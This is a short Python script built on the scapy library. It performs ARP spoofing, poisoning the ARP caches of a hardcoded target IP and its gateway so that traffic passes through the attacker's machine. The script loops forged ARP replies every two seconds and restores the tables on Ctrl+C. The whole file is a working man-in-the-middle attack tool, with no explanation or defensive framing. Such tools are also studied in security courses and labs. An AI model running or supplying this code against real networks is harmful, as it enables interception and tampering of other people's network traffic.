#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=5,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    print("[-] target mac: " + str(target_mac) + "\n")
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # scapy.ls(scapy.ARP())
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)

target_ip = "192.168.206.156" #"172.30.202.4"
gateway_ip = "192.168.206.2" #"172.30.202.1"

sent_packets_count = 0
try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Received CTRL + C ... Resetting ARP table... Please wait..")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
